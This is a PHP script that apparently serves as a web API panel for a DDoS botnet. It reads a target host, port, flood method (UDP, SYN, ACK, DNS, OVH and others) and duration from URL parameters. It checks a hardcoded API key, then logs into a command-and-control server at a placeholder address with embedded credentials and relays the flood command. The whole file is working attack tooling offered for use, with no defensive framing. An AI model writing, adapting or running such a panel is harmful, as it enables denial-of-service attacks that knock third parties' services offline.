<?php
error_reporting(E_ALL);
 
    $APIKeys = array("1", "2", "3");
    $attackMethods = array("STDHEX", "PLAIN", "UDP", "DNS", "OVH", "SYN", "ACK");

    function htmlsc($string)

    {
        return htmlspecialchars($string, ENT_QUOTES, "UTF-8");
    }

    if (!isset($_GET["key"]) || !isset($_GET["host"]) || !isset($_GET["port"]) || !isset($_GET["method"]) || !isset($_GET["time"]))
        die("You are missing a parameter");
    $key = htmlsc($_GET["key"]);
    $host = htmlsc($_GET["host"]);
    $port = htmlsc($_GET["port"]);
    $method = htmlsc(strtoupper($_GET["method"]));
    $time = htmlsc($_GET["time"]);
    $command = "";

    if (!in_array($key, $APIKeys)) die("Invalid API key");
    if (!in_array($method, $attackMethods)) die("Invalid attack method");
    if ($method == "STDHEX") $command = "stdhex $host $time dport=$port\r\n";
    else if ($method == "UDPPLAIN") $command = "plain $host $time dport=$port\r\n";
	else if ($method == "UDP") $command = "udp $host $time dport=$port\r\n";
	else if ($method == "DNS") $command = "dns $host $time dport=$port domain=$host\r\n";
	else if ($method == "OVH") $command = "ovh $host $time dport=$port\r\n";
	else if ($method == "SYN") $command = "syn $host $time dport=$port\r\n";
	else if ($method == "ACK") $command = "ack $host $time dport=$port\r\n";
    $socket = fsockopen("1.2.3.4", "61150"); // Example: $socket = fsockopen("1.2.3.4", 1337);
    ($socket ? null : die("Failed to connect"));
	fwrite($socket, " \r\n"); // If you don't require a username, just remove this line...
	sleep(3);
    fwrite($socket, "Client1\r\n");
	sleep(3);
    fwrite($socket, "t3st111222\r\n");
    sleep(9);
    fwrite($socket, $command);
    fclose($socket);
    echo "Attack sent to $host:$port for $time seconds using method $method!\n";
?>